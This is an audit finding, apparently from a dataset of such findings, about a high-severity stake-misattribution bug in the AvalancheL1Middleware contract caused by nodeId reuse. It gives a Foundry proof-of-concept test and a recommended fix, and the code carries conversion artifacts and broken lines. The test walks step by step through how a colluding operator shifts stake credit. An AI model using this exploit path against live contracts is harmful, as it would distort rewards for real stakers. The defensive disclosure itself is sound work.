# [H] Historical reward lossdue to NodeId reuse in AvalancheL1Middleware

## Summary
Severity: High
Contest weight: 0.0000
Dataset id: 23568
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The AvalancheL1Middleware contract is vulnerable to misattributing stake to a former operator (Operator A) if a new, colluding or coordinated operator (Operator B) intentionally re-registers a node using the exact same bytes32 nodeId that Operator A previously used. This scenario assumes Operator B is aware of Operator A's historical nodeId and that the underlying P-Chain NodeID (P_X, derived from the shared bytes32 nodeId) has become available for re-registration on the L1 BalancerValidatorManager after Operator A's node was fully decommissioned.  
The issue stems from the getActiveNodesForEpoch function, which is utilized by getOperatorUsedStakeCached-PerEpoch for stake calculations. This function iterates through Operator A's historical nodeIds (stored permanently in operatorNodes[A]). When it processes the reused bytes32 nodeId_X, it converts it to its P-Chain NodeID format (P_X). It then queries balancerValidatorManager.registeredValidators(P_X) to get the current L1 validationID. Because Operator B has now re-registered P_X on L1, this query returns Operator B's new validationID_B2.  
Subsequently, getActiveNodesForEpoch checks if the L1 validator instance validationID_B2 (Operator B's node) was active during the queried epoch. If true, the stake associated with validationID_B2 (which is Operator B's stake, read from nodeStakeCache) is incorrectly included in Operator A's "used stake" calculation for that epoch.

## Proof of Concept
```solidity
function test_POC_MisattributedStake_NodeIdReused() public {
    console2.log("--- POC: Misattributed Stake due to NodeID Reuse ---");
    address operatorA = alice;
    address operatorB = charlie; // Using charlie as Operator B
    // Use a specific, predictable nodeId for the test
    bytes32 sharedNodeId_X = keccak256(abi.encodePacked("REUSED_NODE_ID_XYZ"));
    bytes memory blsKey_A = hex"A1A1A1";
    bytes memory blsKey_B = hex"B2B2B2"; // Operator B uses a different BLS key
    uint64 registrationExpiry = uint64(block.timestamp + 2 days);
    address[] memory ownerArr = new address[](1);
    ownerArr[0] = operatorA; // For simplicity, operator owns the PChainOwner
    PChainOwner memory pchainOwner_A = PChainOwner({threshold: 1, addresses: ownerArr});
    ownerArr[0] = operatorB;
    PChainOwner memory pchainOwner_B = PChainOwner({threshold: 1, addresses: ownerArr});
    // Ensure operators have some stake in the vault
    uint256 stakeAmountOpA = 20_000_000_000_000; // e.g., 20k tokens
    uint256 stakeAmountOpB = 30_000_000_000_000; // e.g., 30k tokens
    // Operator A deposits and sets shares
    collateral.transfer(staker, stakeAmountOpA);
    vm.startPrank(staker);
    collateral.approve(address(vault), stakeAmountOpA);
    (,uint256 sharesA) = vault.deposit(operatorA, stakeAmountOpA);
    vm.stopPrank();
    _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, operatorA, sharesA, delegator);
    // Operator B deposits and sets shares (can use the same vault or a different one)
    collateral.transfer(staker, stakeAmountOpB);
    vm.startPrank(staker);
    collateral.approve(address(vault), stakeAmountOpB);
    (,uint256 sharesB) = vault.deposit(operatorB, stakeAmountOpB);
    vm.stopPrank();
    _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, operatorB, sharesB, delegator);
    _calcAndWarpOneEpoch(); // Ensure stakes are recognized
    // --- Epoch E0: Operator A registers node N1 using sharedNodeId_X ---
    console2.log("Epoch E0: Operator A registers node with sharedNodeId_X");
    uint48 epochE0 = middleware.getCurrentEpoch();
    vm.prank(operatorA);
    middleware.addNode(sharedNodeId_X, blsKey_A, registrationExpiry, pchainOwner_A, pchainOwner_A,
    0);,!
    uint32 msgIdx_A1_add = mockValidatorManager.nextMessageIndex() - 1;
    // Get the L1 validationID for Operator A's node
    bytes memory pchainNodeId_P_X_bytes = abi.encodePacked(uint160(uint256(sharedNodeId_X)));
    bytes32 validationID_A1 = mockValidatorManager.registeredValidators(pchainNodeId_P_X_bytes);
    console2.log("Operator A's L1 validationID_A1:", vm.toString(validationID_A1));
    vm.prank(operatorA);
    middleware.completeValidatorRegistration(operatorA, sharedNodeId_X, msgIdx_A1_add);
    _calcAndWarpOneEpoch(); // Move to E0 + 1 for N1 to be active
    epochE0 = middleware.getCurrentEpoch(); // Update epochE0 to where node is active
    uint256 stake_A_on_N1 = middleware.getNodeStake(epochE0, validationID_A1);
    assertGt(stake_A_on_N1, 0, "Operator A's node N1 should have stake in Epoch E0");
    console2.log("Stake of Operator A on node N1 (validationID_A1) in Epoch E0:",
    vm.toString(stake_A_on_N1));,!
    bytes32[] memory activeNodes_A_E0 = middleware.getActiveNodesForEpoch(operatorA, epochE0);
    assertEq(activeNodes_A_E0.length, 1, "Operator A should have 1 active node in E0");
    assertEq(activeNodes_A_E0[0], sharedNodeId_X, "Active node for A in E0 should be
    sharedNodeId_X");,! 
    // --- Epoch E1: Node N1 (validationID_A1) is fully removed ---
    console2.log("Epoch E1: Operator A removes node N1 (validationID_A1)");
    _calcAndWarpOneEpoch();
    uint48 epochE1 = middleware.getCurrentEpoch();
    vm.prank(operatorA);
    middleware.removeNode(sharedNodeId_X);
    uint32 msgIdx_A1_remove = mockValidatorManager.nextMessageIndex() - 1;
    _calcAndWarpOneEpoch(); // To process removal in cache
    epochE1 = middleware.getCurrentEpoch(); // Update E1 to where removal is cached
    assertEq(middleware.getNodeStake(epochE1, validationID_A1), 0, "Stake for validationID_A1
    should be 0 after removal in cache");,!
    vm.prank(operatorA);
    middleware.completeValidatorRemoval(msgIdx_A1_remove); // L1 confirms removal
    console2.log("P-Chain NodeID P_X (derived from sharedNodeId_X) is now considered available on
    L1.");,!
    activeNodes_A_E0 = middleware.getActiveNodesForEpoch(operatorA, epochE1); // Check active nodes
    for A in E1,!
    assertEq(activeNodes_A_E0.length, 0, "Operator A should have 0 active nodes in E1 after
    removal");,! 
    // --- Epoch E2: Operator B re-registers a node N2 using the *exact same sharedNodeId_X* ---
    console2.log("Epoch E2: Operator B registers a new node N2 using the same sharedNodeId_X");
    _calcAndWarpOneEpoch();
    uint48 epochE2 = middleware.getCurrentEpoch();
    vm.prank(operatorB);
    middleware.addNode(sharedNodeId_X, blsKey_B, registrationExpiry, pchainOwner_B, pchainOwner_B,
    0);,!
    uint32 msgIdx_B2_add = mockValidatorManager.nextMessageIndex() - 1;
    // Get the L1 validationID for Operator B's new node (N2)
    bytes32 validationID_B2 = mockValidatorManager.registeredValidators(pchainNodeId_P_X_bytes);
    console2.log("Operator B's new L1 validationID_B2 for sharedNodeId_X:",
    vm.toString(validationID_B2));,!
    assertNotEq(validationID_A1, validationID_B2, "L1 validationID for B's node should be different
    from A's old one");,!
    vm.prank(operatorB);
    middleware.completeValidatorRegistration(operatorB, sharedNodeId_X, msgIdx_B2_add);
    _calcAndWarpOneEpoch(); // Move to E2 + 1 for N2 to be active
    epochE2 = middleware.getCurrentEpoch(); // Update epochE2 to where node is active
    uint256 stake_B_on_N2 = middleware.getNodeStake(epochE2, validationID_B2);
    assertGt(stake_B_on_N2, 0, "Operator B's node N2 should have stake in Epoch E2");
    console2.log("Stake of Operator B on node N2 (validationID_B2) in Epoch E2:",
    vm.toString(stake_B_on_N2));,!
    bytes32[] memory activeNodes_B_E2 = middleware.getActiveNodesForEpoch(operatorB, epochE2);
    assertEq(activeNodes_B_E2.length, 1, "Operator B should have 1 active node in E2");
    assertEq(activeNodes_B_E2[0], sharedNodeId_X);
    // --- Querying for Operator A's Stake in Epoch E2 (THE VULNERABILITY) ---
    console2.log("Querying Operator A's used stake in Epoch E2 (where B's node is active with
    sharedNodeId_X)");,!
    // Ensure caches are up-to-date for Operator A for epoch E2
    middleware.calcAndCacheStakes(epochE2, middleware.PRIMARY_ASSET_CLASS());
    uint256 usedStake_A_E2 = middleware.getOperatorUsedStakeCachedPerEpoch(epochE2, operatorA,
    middleware.PRIMARY_ASSET_CLASS());,!
    console2.log("Calculated 'used stake' for Operator A in Epoch E2: ",
    vm.toString(usedStake_A_E2));,! 
    // ASSERTION: Operator A's used stake should be 0 in epoch E2, as their node was removed in E1.
    // However, due to the issue, it will pick up Operator B's stake.
    assertEq(usedStake_A_E2, stake_B_on_N2, "FAIL: Operator A's used stake in E2 is misattributed
    with Operator B's stake!");,! 
    // Let's ensure B's node is indeed seen as active by the mock in E2
    Validator memory validator_B2_details = mockValidatorManager.getValidator(validationID_B2);
    uint48 epochE2_startTs = middleware.getEpochStartTs(epochE2);
    bool b_node_active_in_e2 = uint48(validator_B2_details.startedAt) <= epochE2_startTs &&
    (validator_B2_details.endedAt == 0 ||
    uint48(validator_B2_details.endedAt) >= epochE2_startTs);,!
    assertTrue(b_node_active_in_e2, "Operator B's node (validationID_B2) should be active in Epoch
    E2");,!
    console2.log("--- PoC End ---");
}
```

## Recommendation
Recommended Mitigation: The AvalancheL1Middleware must ensure that when calculating an operator's historical stake, it strictly associates the activity with the L1 validator instances that operator originally registered.  
1. Store L1 validationID with Original Registration: When an operator (e.g., Operator A) registers a middlewareNodeId (e.g., nodeId_X), the unique L1 validationID (e.g., validationID_A1) returned by BalancerValidatorManager must be durably linked to Operator A and nodeId_X for that specific registration lifecycle within the middleware.  
2. Modify getActiveNodesForEpoch Logic:  
• When getActiveNodesForEpoch(A, epoch) is called, it should iterate through the (middlewareNodeId, original_l1_validationID) pairs that Operator A historically registered.  
• For each original_l1_validationID (e.g., validationID_A1):  
  – Query balancerValidatorManager.getValidator(validationID_A1) to get its historical startedAt and endedAt times.  
  – If this specific instance validationID_A1 was active during the queried epoch, then use validationID_A1 to look up stake in nodeStakeCache.  
• This prevents the lookup from "slipping" to a newer validationID (like validationID_B2) that might currently be associated with the reused P-Chain NodeID P_X on L1 but was not the instance Operator A managed.
